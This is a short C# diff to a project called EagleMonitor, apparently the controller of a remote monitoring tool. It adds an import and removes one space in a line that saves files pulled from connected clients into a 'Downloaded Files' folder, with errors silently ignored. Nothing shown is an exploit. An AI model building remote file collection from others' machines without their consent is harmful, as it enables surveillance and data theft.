@@ -1,5 +1,6 @@
 ﻿using EagleMonitor.Networking;
 using EagleMonitor.Utils;
+using PacketLib;
 using PacketLib.Packet;
 using System.Threading;
 
@@ -33,7 +34,7 @@ namespace EagleMonitor.PacketParser
                     {
                         if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Downloaded Files\\"))
                             System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files");
-                        System.IO.File.WriteAllBytes(clientHandler.clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName), downloadFilePacket.file);
+                        System.IO.File.WriteAllBytes(clientHandler.clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName),downloadFilePacket.file);
                     }
                 }
                 catch { }
